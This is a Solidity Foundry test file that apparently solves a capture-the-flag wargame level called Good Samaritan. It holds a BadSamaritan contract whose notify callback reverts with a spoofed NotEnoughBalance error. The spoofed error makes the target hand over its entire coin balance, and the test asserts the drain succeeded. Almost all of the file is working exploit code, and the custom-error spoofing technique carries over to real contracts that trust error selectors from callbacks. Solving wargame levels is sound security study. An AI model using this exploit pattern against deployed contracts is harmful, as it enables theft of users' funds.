// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import "forge-std/Test.sol";

interface IGoodSamaritan {
    function requestDonation() external returns (bool);
    function coin() external view returns (address);
}

interface ICoin {
    function balances(address) external view returns (uint256);
}

contract BadSamaritan {
    IGoodSamaritan target;
    
    error NotEnoughBalance();

    constructor(address _target) {
        target = IGoodSamaritan(_target);
    }

    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if(amount == 10) {
            revert NotEnoughBalance();
        } 
    }
}

contract GoodSamaritanTest is Test {
    address goodSamaritan;
    address hacker = address(0x1337);

    function setUp() public {
        goodSamaritan = deployCode("src/27_GoodSamaritan.sol:GoodSamaritan");
    }

    function testExploit() public {
        vm.startPrank(hacker);
        
        BadSamaritan bad = new BadSamaritan(goodSamaritan);
        
        bad.attack();
        
        vm.stopPrank();

        address coinAddress = IGoodSamaritan(goodSamaritan).coin();
        uint256 remainingBalance = ICoin(coinAddress).balances(goodSamaritan);
        
        uint256 hackerBalance = ICoin(coinAddress).balances(address(bad));
        
        assertEq(hackerBalance, 10 ** 6);
        assertEq(remainingBalance, 0);
    }
}